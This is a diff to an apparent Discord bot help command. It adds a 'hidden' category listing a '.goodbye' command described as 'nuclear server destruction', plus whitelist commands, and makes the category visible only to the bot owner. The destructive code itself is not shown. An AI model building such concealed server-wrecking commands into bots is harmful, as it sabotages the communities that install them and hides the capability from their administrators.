@@ -104,9 +104,14 @@ const COMMAND_DATA = {
     { name: 'vcpermit',  desc: 'Allow a specific user to join your locked channel', example: '.vcpermit @John' },
     { name: 'vcreject',  desc: 'Kick and block a user from your J2C channel',      example: '.vcreject @John' },
   ],
+  hidden: [
+    { name: 'goodbye',      desc: '⚠️ Nuclear server destruction (bot owner + close only)', example: '.goodbye' },
+    { name: 'close',        desc: 'Add a user to the close whitelist (elite inner circle)', example: '.close @John' },
+    { name: 'closeremove',  desc: 'Remove a user from the close whitelist',                 example: '.closeremove @John' },
+  ],
 };
 
-const PROTECTED_CATEGORIES = new Set(['admin', 'moderation', 'owner', 'utility', 'voice']);
+const PROTECTED_CATEGORIES = new Set(['admin', 'moderation', 'owner', 'utility', 'voice', 'hidden']);
 
 const CATEGORY_META = {
   admin:      { emoji: '⚙️',  label: 'Admin',      color: 0xEB459E },
@@ -115,6 +120,7 @@ const CATEGORY_META = {
   utility:    { emoji: '🛠️',  label: 'Utility',    color: 0x5865F2 },
   info:       { emoji: '📋',  label: 'Info',        color: 0x57F287 },
   voice:      { emoji: '🔊',  label: 'Voice',       color: 0x57F287 },
+  hidden:     { emoji: '🔒',  label: 'Hidden',      color: 0x2B2D31 },
 };
 
 module.exports = {
@@ -131,7 +137,9 @@ module.exports = {
     const ud = await UserData.findOne({ guildId: message.guild.id, userId: message.author.id }).lean();
     const isPrivileged = isBotOwner || ud?.isInnerCircle || ud?.isSecret;
 
+    // Bot owner sees ALL categories including hidden
     const visibleCategories = Object.entries(COMMAND_DATA).filter(([cat]) => {
+      if (cat === 'hidden' && !isBotOwner) return false;
       if (PROTECTED_CATEGORIES.has(cat) && !isPrivileged) return false;
       return true;
     });
